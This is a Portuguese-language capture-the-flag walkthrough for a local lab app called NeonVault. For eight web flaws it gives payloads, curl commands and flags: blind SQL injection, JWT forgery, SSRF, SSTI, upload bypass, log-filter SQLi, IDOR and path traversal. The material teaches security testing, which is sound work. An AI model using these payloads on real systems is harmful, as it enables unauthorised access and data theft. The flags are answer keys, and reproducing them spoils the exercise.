# Walkthrough - Lab 2 NeonVault

Aviso:
Este arquivo contém spoilers completos, payloads e flags. Use somente depois de tentar resolver o lab por conta própria.

Este walkthrough foi escrito em modo manual/browser-first. A ideia é resolver como uma pessoa iniciante faria em um ambiente real: abrindo páginas, clicando na interface, observando respostas no navegador, usando DevTools e Burp Suite para entender as requisições, e deixando `curl` como alternativa para repetir testes.

## Preparação

Suba o laboratório:

```bash
cd ~/ctf-labs/lab-02-neonvault
docker compose up --build
```

Acesse no navegador:

```text
http://127.0.0.1:8092
```

Credencial inicial:

```text
nova / nova2099
```

Ferramentas úteis:

- Navegador: caminho principal deste guia.
- DevTools: para ver cookies, requisições, respostas, status HTTP e tempos.
- Burp Suite: para interceptar, mandar requisições ao Repeater e editar parâmetros.
- Terminal: útil para criar arquivos de upload, gerar token JWT e repetir testes.
- `curl`: alternativa para reproduzir a mesma requisição de forma precisa.
- `jq`: opcional, apenas para formatar JSON.

## Como jogar em modo manual

Comece pela home, faça login com `nova / nova2099` e use o dashboard como hub. Os textos da interface não entregam payloads prontos, mas indicam módulos suspeitos: recuperação legada, tokens de sessão, integrações internas, templates, uploads, logs, tickets e downloader legado.

Um bom ritmo para cada vulnerabilidade é:

1. Abrir a página no navegador.
2. Fazer um teste normal pela interface.
3. Observar o que muda visualmente.
4. Abrir DevTools > Network para ver a requisição real.
5. Repetir no Burp Repeater quando precisar editar parâmetros com cuidado.
6. Usar `curl` só como comando equivalente ou para medir tempo.

Se quiser usar Burp, configure o navegador para usar o proxy do Burp, deixe o Intercept ligado apenas quando for capturar uma requisição específica e depois envie a requisição para o Repeater. Como o lab usa HTTP local, você não precisa lidar com certificado HTTPS.

## 1. Time-Based Blind SQL Injection

### Ideia da falha

A aplicação tem um fluxo legado de recuperação de acesso. O endpoint auxiliar `/api/check-user` monta uma consulta insegura com o parâmetro `username`. Como a resposta não mostra diretamente o código de recuperação do admin, usamos atraso de resposta para inferir o valor caractere por caractere.

Isso é uma SQL Injection cega baseada em tempo: quando a condição é verdadeira, o servidor demora; quando é falsa, responde rápido.

### Caminho manual pela interface

1. Abra `http://127.0.0.1:8092/login`.
2. Tente um payload básico no login, por exemplo `admin' OR '1'='1'--`.
3. Observe que o login rejeita o teste e sugere investigar recuperação de acesso.
4. Abra `http://127.0.0.1:8092/recover`.
5. Leia a página: o formulário pede `username` e código de recuperação.
6. Ainda no navegador, acesse:

```text
http://127.0.0.1:8092/api/check-user?username=admin
```

7. Observe o JSON. O usuário existe, mas o código de recuperação não aparece.
8. Compare com:

```text
http://127.0.0.1:8092/api/check-user?username=ghost
```

9. Repare que esse endpoint é uma superfície de consulta separada do login.

Pelo navegador, você consegue ver o endpoint e confirmar usuários. Para medir atraso com precisão, Burp Repeater ou terminal são mais confortáveis.

### Como testar com DevTools ou Burp

No DevTools:

1. Abra DevTools > Network.
2. Acesse `/api/check-user?username=admin`.
3. Clique na requisição e veja `Headers`, `Response` e a coluna de tempo.
4. Repita com um payload injetado e compare o tempo.

No Burp:

1. Capture a requisição `GET /api/check-user?username=admin`.
2. Envie para o Repeater.
3. Edite apenas o valor de `username`.
4. Teste uma condição verdadeira:

```text
admin' AND IF(SUBSTR(recovery_code,1,1)='N',SLEEP(2),0)--
```

5. Envie a requisição e observe que ela demora perto de 2 segundos.
6. Troque `N` por `X` e observe que a resposta volta rápido.

Quando estiver usando a barra do navegador ou Burp, deixe o cliente codificar a URL ou codifique caracteres especiais se necessário. O importante é que o parâmetro final recebido pelo backend seja o payload acima.

Depois de descobrir que a primeira letra é `N`, repita a lógica para as próximas posições. O código extraído é:

```text
N3ON
```

Volte para `/recover` e preencha o formulário:

```text
username: admin
recovery_code: N3ON
```

O nome do campo no formulário é `recovery_code`.

### Payload usado

Condição verdadeira:

```text
admin' AND IF(SUBSTR(recovery_code,1,1)='N',SLEEP(2),0)--
```

Condição falsa para comparação:

```text
admin' AND IF(SUBSTR(recovery_code,1,1)='X',SLEEP(2),0)--
```

Extração caractere por caractere:

```text
SUBSTR(recovery_code,1,1)='N'
SUBSTR(recovery_code,2,1)='3'
SUBSTR(recovery_code,3,1)='O'
SUBSTR(recovery_code,4,1)='N'
```

### Alternativa via curl

Use `curl` quando quiser medir tempo de forma mais clara:

```bash
curl -sG http://127.0.0.1:8092/api/check-user --data-urlencode "username=admin"
curl -sG http://127.0.0.1:8092/api/check-user --data-urlencode "username=ghost"
```

Condição verdadeira:

```bash
time curl -sG http://127.0.0.1:8092/api/check-user \
  --data-urlencode "username=admin' AND IF(SUBSTR(recovery_code,1,1)='N',SLEEP(2),0)-- "
```

Condição falsa:

```bash
time curl -sG http://127.0.0.1:8092/api/check-user \
  --data-urlencode "username=admin' AND IF(SUBSTR(recovery_code,1,1)='X',SLEEP(2),0)-- "
```

Envio final do código recuperado:

```bash
curl -i -X POST http://127.0.0.1:8092/recover \
  -d "username=admin" \
  -d "recovery_code=N3ON"
```

### Resultado esperado

A tela de recuperação aceita o código do admin e mostra a evidência da falha.

### Flag

```text
FLAG{blind_sqli_extracted_admin}
```

### O que você aprendeu

Blind SQLi baseada em tempo permite extrair dados mesmo quando o servidor não imprime o resultado da consulta. A diferença observável está no tempo de resposta.

## 2. JWT Weak Secret / Token Forgery

### Ideia da falha

Depois do login, a sessão é representada por um JWT. O token do usuário comum possui `role=user`. Como o segredo de assinatura é fraco, é possível gerar outro token com `role=admin` e acessar uma rota privilegiada.

JWT não criptografa o payload por padrão. Qualquer pessoa pode visualizar as claims; o que protege contra alteração é a assinatura.

### Caminho manual pela interface

1. Faça login com `nova / nova2099`.
2. Abra `http://127.0.0.1:8092/admin/core`.
3. Observe o bloqueio `403`: você tem sessão válida, mas não tem role administrativa.
4. Abra DevTools > Application > Cookies.
5. Selecione `http://127.0.0.1:8092`.
6. Localize o cookie `neon_token`.
7. Copie o valor do token.

Para estudar o token em ambiente local de laboratório, cole o valor em `jwt.io` ou use uma ferramenta local de JWT. Você deve ver um payload parecido com:

```json
{
  "sub": 2,
  "username": "nova",
  "displayName": "Nova Tanaka",
  "role": "user"
}
```

O objetivo é criar um token equivalente, mas com `role=admin`.

### Como testar com DevTools ou Burp

No Burp:

1. Capture uma requisição para `/admin/core`.
2. Envie para o Repeater.
3. Gere um token admin usando o comando da seção de payload.
4. No Repeater, remova o header `Cookie` ou substitua o valor do cookie `neon_token` pelo token forjado.
5. Adicione ou ajuste este header:

```text
Authorization: Bearer SEU_TOKEN_ADMIN
```

6. Envie a requisição.

Detalhe importante: nesta aplicação, se a requisição tiver cookie e header `Authorization`, o backend usa o cookie primeiro. Por isso, no Burp Repeater, remova o cookie antigo ou troque o próprio cookie pelo token admin.

No navegador, outra forma manual é editar o valor do cookie `neon_token` em DevTools > Application > Cookies, colar o token admin e recarregar `/admin/core`.

### Payload usado

Payload JWT desejado:

```json
{
  "sub": 2,
  "username": "nova",
  "displayName": "Nova Tanaka",
  "role": "admin"
}
```

Segredo fraco usado pelo lab:

```text
neon
```

Gerar token com Node dentro do container:

```bash
cd ~/ctf-labs/lab-02-neonvault
TOKEN=$(docker compose exec -T neonvault node -e "const jwt=require('jsonwebtoken'); console.log(jwt.sign({sub:2,username:'nova',displayName:'Nova Tanaka',role:'admin'}, 'neon'))")
echo "$TOKEN"
```

### Alternativa via curl

Depois de gerar `TOKEN`, faça uma requisição sem cookie antigo:

```bash
curl -i -H "Authorization: Bearer $TOKEN" http://127.0.0.1:8092/admin/core
```

### Resultado esperado

O Admin Core abre com o token forjado e mostra a evidência de acesso privilegiado.

### Flag

```text
FLAG{jwt_forged_neon_admin}
```

### O que você aprendeu

JWT com segredo fraco permite forjar claims. Se a aplicação confia em `role` dentro do token, um atacante pode elevar privilégios ao assinar um novo token.

## 3. SSRF em Webhook Tester

### Ideia da falha

O Webhook Tester recebe uma URL e faz o servidor buscar essa URL. Isso é perigoso porque o servidor pode alcançar endereços internos que o seu navegador não acessaria diretamente.

Neste lab, `127.0.0.1` tem dois sentidos:

- No navegador, é a sua máquina.
- No backend, é o próprio container/processo do servidor.

### Caminho manual pela interface

1. Faça login.
2. No menu ou dashboard, abra `http://127.0.0.1:8092/tools/webhook`.
3. No campo `URL alvo`, envie primeiro uma URL comum, como `https://example.com`.
4. Observe que a página mostra a resposta buscada pelo servidor.
5. Agora coloque a URL interna:

```text
http://127.0.0.1:5000/internal/status
```

6. Envie o formulário.
7. Observe o bloco `Resposta`. Ele deve mostrar um serviço interno chamado `neonvault-internal-metadata`.
8. Use a pista do status e teste:

```text
http://127.0.0.1:5000/internal/flag
```

### Como testar com DevTools ou Burp

No DevTools:

1. Abra DevTools > Network.
2. Envie o formulário do webhook.
3. Clique na requisição `POST /tools/webhook`.
4. Veja em `Payload` que o campo enviado se chama `url`.
5. Veja em `Response` que o backend renderiza o retorno da URL alvo.

No Burp:

1. Intercepte o envio do formulário.
2. Envie para o Repeater.
3. Edite o corpo da requisição para alterar o parâmetro `url`.
4. Teste primeiro `/internal/status`.
5. Depois troque para `/internal/flag`.

### Payload usado

Status interno:

```text
http://127.0.0.1:5000/internal/status
```

Endpoint sensível:

```text
http://127.0.0.1:5000/internal/flag
```

### Alternativa via curl

Crie uma sessão e repita o POST:

```bash
curl -i -c cookies.txt -X POST http://127.0.0.1:8092/login \
  -d "username=nova" \
  -d "password=nova2099"

curl -i -b cookies.txt -X POST http://127.0.0.1:8092/tools/webhook \
  -d "url=http://127.0.0.1:5000/internal/status"

curl -i -b cookies.txt -X POST http://127.0.0.1:8092/tools/webhook \
  -d "url=http://127.0.0.1:5000/internal/flag"
```

### Resultado esperado

A resposta do serviço interno aparece dentro da própria página do Webhook Tester.

### Flag

```text
FLAG{ssrf_internal_neon_service}
```

### O que você aprendeu

SSRF acontece quando o servidor busca uma URL controlada pelo usuário. O impacto aumenta quando o servidor consegue acessar serviços internos não expostos publicamente.

## 4. SSTI em Messages Preview

### Ideia da falha

A tela de preview renderiza a mensagem como template no servidor. Se a entrada do usuário é interpretada como expressão, ela pode acessar dados do contexto interno do template.

O teste clássico é enviar uma expressão simples e ver se o servidor calcula o resultado.

### Caminho manual pela interface

1. Faça login.
2. Abra `http://127.0.0.1:8092/messages/preview`.
3. No textarea `Mensagem`, digite uma frase normal:

```text
Operador online
```

4. Clique em `Renderizar preview` e observe que a frase aparece como texto.
5. Agora substitua o conteúdo por:

```text
{{7*7}}
```

6. Envie novamente.
7. Se o preview mostrar `49`, o servidor avaliou a expressão.
8. Depois teste o objeto disponível no contexto:

```text
{{vault.sstiSecret}}
```

### Como testar com DevTools ou Burp

No DevTools:

1. Abra DevTools > Network.
2. Envie a mensagem pelo formulário.
3. Clique em `POST /messages/preview`.
4. Confira que o corpo envia o campo `template`.
5. Veja a resposta HTML renderizada com o resultado do template.

No Burp:

1. Capture o `POST /messages/preview`.
2. Envie para o Repeater.
3. Altere apenas o parâmetro `template`.
4. Teste `{{7*7}}` para provar execução.
5. Teste `{{vault.sstiSecret}}` para acessar o segredo do contexto.

### Payload usado

Prova de avaliação:

```text
{{7*7}}
```

Leitura do segredo:

```text
{{vault.sstiSecret}}
```

### Alternativa via curl

```bash
curl -i -c cookies.txt -X POST http://127.0.0.1:8092/login \
  -d "username=nova" \
  -d "password=nova2099"

curl -i -b cookies.txt -X POST http://127.0.0.1:8092/messages/preview \
  -d "template={{7*7}}"

curl -i -b cookies.txt -X POST http://127.0.0.1:8092/messages/preview \
  -d "template={{vault.sstiSecret}}"
```

### Resultado esperado

O preview mostra `49` no primeiro teste e depois revela o valor sensível disponível no contexto do template.

### Flag

```text
FLAG{ssti_template_breach}
```

### O que você aprendeu

SSTI ocorre quando texto controlado pelo usuário é processado como template. Uma expressão simples como `{{7*7}}` já prova que o servidor está interpretando conteúdo enviado pelo usuário.

## 5. File Upload Bypass

### Ideia da falha

A aplicação tenta validar uploads de avatar/badge, mas o filtro legado confia demais no nome e na extensão do arquivo. Isso permite enviar um arquivo que não deveria passar pelo fluxo.

Aqui o envio principal será pelo navegador. O terminal entra só para criar arquivos de teste.

### Caminho manual pela interface

1. Faça login.
2. Abra `http://127.0.0.1:8092/avatar`.
3. Crie um arquivo `.txt` simples no terminal:

```bash
printf 'teste de upload' > /tmp/avatar.txt
```

4. No navegador, selecione esse `.txt` e envie pelo formulário.
5. Observe a rejeição: `Extensão recusada pelo filtro legado`.
6. Crie um arquivo `.png` simples:

```bash
printf 'fake image' > /tmp/avatar.png
```

7. Envie o `.png` pelo formulário.
8. Observe que o upload é aceito e que a tela mostra um link de cache.
9. Agora crie o arquivo de bypass:

```bash
printf '<h1>NEON_UPLOAD_PROBE</h1>' > /tmp/badge.html
```

10. Envie `badge.html` pelo formulário.
11. Observe a mensagem de sucesso e a evidência exibida na página.

Se o navegador estiver no Windows e o arquivo foi criado no WSL, você pode selecionar o arquivo pelo caminho de rede, por exemplo:

```text
\\wsl.localhost\Ubuntu\tmp\badge.html
```

### Como testar com DevTools ou Burp

No DevTools:

1. Abra DevTools > Network.
2. Envie um arquivo pelo formulário.
3. Abra a requisição `POST /avatar`.
4. Veja que o envio usa `multipart/form-data`.
5. Observe o nome do campo: `avatar`.

No Burp:

1. Intercepte o envio de um arquivo.
2. Envie a requisição para o Repeater.
3. Observe o bloco multipart com `filename=...`.
4. Teste a diferença entre `avatar.txt`, `avatar.png` e `badge.html`.
5. O ponto didático é perceber que o filtro olha para o nome/extensão, não para uma validação robusta do conteúdo.

### Payload usado

Conteúdo do arquivo usado para acionar a evidência:

```html
<h1>NEON_UPLOAD_PROBE</h1>
```

Nome do arquivo:

```text
badge.html
```

Outros nomes que demonstram a fraqueza do filtro:

```text
avatar.php.png
template.phtml
```

### Alternativa via curl

```bash
curl -i -c cookies.txt -X POST http://127.0.0.1:8092/login \
  -d "username=nova" \
  -d "password=nova2099"

printf '<h1>NEON_UPLOAD_PROBE</h1>' > /tmp/badge.html

curl -i -b cookies.txt -X POST http://127.0.0.1:8092/avatar \
  -F "avatar=@/tmp/badge.html;filename=badge.html"
```

### Resultado esperado

O upload de `.txt` é recusado, o `.png` é aceito como caso normal e `badge.html` revela a evidência do bypass.

### Flag

```text
FLAG{upload_filter_bypass}
```

### O que você aprendeu

Validar upload apenas por nome ou extensão é frágil. Sistemas reais precisam validar conteúdo, tipo, armazenamento, execução e autorização de acesso ao arquivo.

## 6. SQL Injection em filtro de logs

### Ideia da falha

A falha está em um filtro de logs, não no login. A página monta uma consulta usando o parâmetro `level`. Ao alterar a lógica do filtro, conseguimos expandir a listagem e revelar logs ocultos.

### Caminho manual pela interface

1. Faça login.
2. Abra `http://127.0.0.1:8092/logs`.
3. No campo `Level`, deixe `error` e clique em `Filtrar`.
4. Observe os logs comuns.
5. Repare no bloco `Legacy filter trace`: ele mostra a consulta montada com o valor do filtro.
6. Agora altere o parâmetro diretamente na barra de endereço:

```text
http://127.0.0.1:8092/logs?level=error' OR '1'='1'--
```

7. Se o navegador codificar ou bagunçar as aspas, faça a mesma alteração no Burp Repeater.
8. Observe que a página indica filtro expandido e passa a mostrar um log oculto.

### Como testar com DevTools ou Burp

No DevTools:

1. Abra DevTools > Network.
2. Use o formulário de filtro.
3. Clique na requisição `GET /logs?level=error`.
4. Veja o parâmetro `level` em `Headers` ou `Payload`.
5. Compare a resposta normal com a resposta injetada.

No Burp:

1. Capture `GET /logs?level=error`.
2. Envie para o Repeater.
3. Substitua o valor de `level` por:

```text
error' OR '1'='1'--
```

4. Envie e observe que a resposta HTML inclui mais registros.

### Payload usado

```text
error' OR '1'='1'--
```

### Alternativa via curl

```bash
curl -i -c cookies.txt -X POST http://127.0.0.1:8092/login \
  -d "username=nova" \
  -d "password=nova2099"

curl -i -b cookies.txt "http://127.0.0.1:8092/logs?level=error"

curl -i -b cookies.txt -G http://127.0.0.1:8092/logs \
  --data-urlencode "level=error' OR '1'='1'-- "
```

### Resultado esperado

A página de logs passa a exibir uma entrada oculta que contém a evidência.

### Flag

```text
FLAG{logs_filter_sqli}
```

### O que você aprendeu

SQL Injection aparece em filtros, buscas, relatórios e painéis administrativos. Não é uma falha exclusiva de telas de login.

## 7. IDOR em API de tickets

### Ideia da falha

A API retorna tickets por ID, mas não valida corretamente se o objeto pertence ao usuário autenticado. Como os IDs são previsíveis, trocar o número na URL permite acessar um ticket administrativo.

IDOR significa Insecure Direct Object Reference: o usuário controla uma referência direta a um objeto e o servidor esquece de aplicar autorização naquele objeto.

### Caminho manual pela interface

1. Faça login.
2. Abra `http://127.0.0.1:8092/profile`.
3. Leia as pistas sobre tickets e identificadores numéricos.
4. Abra diretamente no navegador:

```text
http://127.0.0.1:8092/api/tickets/101
```

5. Observe o JSON de um ticket do usuário comum.
6. Troque apenas o ID na URL:

```text
http://127.0.0.1:8092/api/tickets/777
```

7. Observe que a API retorna um ticket administrativo que o usuário `nova` não deveria acessar.

### Como testar com DevTools ou Burp

No DevTools:

1. Abra a URL `/api/tickets/101`.
2. Veja a resposta JSON.
3. Troque o número no endereço e recarregue.
4. Compare os campos `ownerId`, `title` e `body`.

No Burp:

1. Capture `GET /api/tickets/101`.
2. Envie para o Repeater.
3. Altere o caminho para `/api/tickets/777`.
4. Envie a requisição.
5. Verifique que o status continua `200` e o corpo contém dados administrativos.

### Payload usado

Não há payload complexo. O teste é trocar um identificador previsível:

```text
/api/tickets/101
/api/tickets/777
```

### Alternativa via curl

```bash
curl -i -c cookies.txt -X POST http://127.0.0.1:8092/login \
  -d "username=nova" \
  -d "password=nova2099"

curl -i -b cookies.txt http://127.0.0.1:8092/api/tickets/101
curl -i -b cookies.txt http://127.0.0.1:8092/api/tickets/777
```

### Resultado esperado

A API retorna um ticket administrativo para um usuário comum autenticado.

### Flag

```text
FLAG{api_idor_object_leak}
```

### O que você aprendeu

Autenticação não substitui autorização por objeto. Mesmo logado, o usuário só deveria acessar tickets que pertencem a ele ou que sua role permite acessar.

## 8. Path Traversal

### Ideia da falha

O downloader recebe um nome de arquivo pelo parâmetro `file` e concatena esse valor com o diretório de downloads. Sem normalizar e limitar o caminho final, `../` permite sair da pasta esperada e ler arquivos do servidor.

O fluxo deste lab é seguir uma trilha:

```text
Files -> Download -> access.log -> backup legado
```

### Caminho manual pela interface

1. Faça login.
2. Abra `http://127.0.0.1:8092/files`.
3. Clique em `Baixar` no arquivo `report.pdf`.
4. Observe a URL gerada:

```text
http://127.0.0.1:8092/download?file=report.pdf
```

5. Isso confirma o comportamento normal do downloader.
6. Agora altere manualmente a URL para ler um log fora da pasta pública:

```text
http://127.0.0.1:8092/download?file=../../var/log/neonvault/access.log
```

7. Leia o conteúdo retornado no navegador.
8. O log aponta para um backup legado:

```text
../../backup/legacy-admin-notes.bak
```

9. Abra esse caminho pelo mesmo downloader:

```text
http://127.0.0.1:8092/download?file=../../backup/legacy-admin-notes.bak
```

### Como testar com DevTools ou Burp

No DevTools:

1. Clique em um download normal na página `/files`.
2. Abra DevTools > Network.
3. Clique na requisição `GET /download?file=report.pdf`.
4. Observe que o arquivo vem do parâmetro `file`.
5. Edite a URL na barra do navegador para inserir `../`.

No Burp:

1. Capture `GET /download?file=report.pdf`.
2. Envie para o Repeater.
3. Troque `report.pdf` por `../../var/log/neonvault/access.log`.
4. Envie e leia a resposta.
5. Use a pista do log para trocar o parâmetro por `../../backup/legacy-admin-notes.bak`.

### Payload usado

Leitura do log:

```text
../../var/log/neonvault/access.log
```

Leitura do backup indicado pelo log:

```text
../../backup/legacy-admin-notes.bak
```

### Alternativa via curl

```bash
curl -i "http://127.0.0.1:8092/download?file=report.pdf"

curl -i "http://127.0.0.1:8092/download?file=../../var/log/neonvault/access.log"

curl -i "http://127.0.0.1:8092/download?file=../../backup/legacy-admin-notes.bak"
```

### Resultado esperado

O endpoint de download lê o log fora da pasta pública, revela a pista do backup e depois retorna o backup legado com a evidência.

### Flag

```text
FLAG{traversal_follow_the_logs}
```

### O que você aprendeu

Path Traversal acontece quando a aplicação aceita caminhos controlados pelo usuário sem garantir que o arquivo final continua dentro do diretório permitido. Logs e backups são alvos comuns durante investigação.

## Checklist final

- [ ] FLAG{blind_sqli_extracted_admin}
- [ ] FLAG{jwt_forged_neon_admin}
- [ ] FLAG{ssrf_internal_neon_service}
- [ ] FLAG{ssti_template_breach}
- [ ] FLAG{upload_filter_bypass}
- [ ] FLAG{logs_filter_sqli}
- [ ] FLAG{api_idor_object_leak}
- [ ] FLAG{traversal_follow_the_logs}

## O que este lab ensina

- Blind SQLi: como inferir dados por diferença de tempo quando a resposta não mostra o resultado.
- JWT: como claims podem ser forjadas quando o segredo de assinatura é fraco.
- SSRF: como uma aplicação pode ser induzida a acessar recursos internos.
- SSTI: como entrada do usuário pode ser interpretada pelo servidor como template.
- Upload Bypass: como validações fracas de nome/extensão podem ser contornadas.
- SQLi: como filtros e buscas também podem ser superfícies de injeção.
- IDOR: como objetos previsíveis vazam dados sem controle de autorização por dono.
- Path Traversal: como parâmetros de arquivo podem escapar do diretório esperado.

## Troubleshooting

Docker não está rodando:

```bash
docker compose ps
```

Se o daemon não responder, inicie o Docker Desktop ou o serviço Docker do seu ambiente.

Porta `8092` em uso:

```bash
docker compose down
docker compose ps
```

Se outro processo estiver usando a porta, pare o processo antigo ou ajuste o ambiente antes de subir o lab.

Usuário sem permissão para Docker:

- No Linux, verifique se seu usuário pertence ao grupo `docker`.
- Como alternativa local, use o padrão recomendado pelo seu ambiente, como `sudo docker`.

Container antigo:

```bash
docker compose down
docker compose up --build
```

Rota autenticada retorna login ou bloqueio:

- Faça login novamente com `nova / nova2099`.
- Apague cookies antigos do navegador para `127.0.0.1`.
- Em `curl`, recrie `cookies.txt` com o POST de login.

Burp não intercepta:

- Confirme que o navegador está usando o proxy do Burp.
- Confirme que a interceptação está ligada.
- Para HTTPS seria necessário certificado, mas este lab usa HTTP local.

Payload parece não funcionar no navegador:

- Tente codificar pela barra de endereço.
- Use Burp Repeater para controlar o parâmetro.
- Use `curl --data-urlencode` quando o payload tiver espaços, aspas ou caracteres especiais.
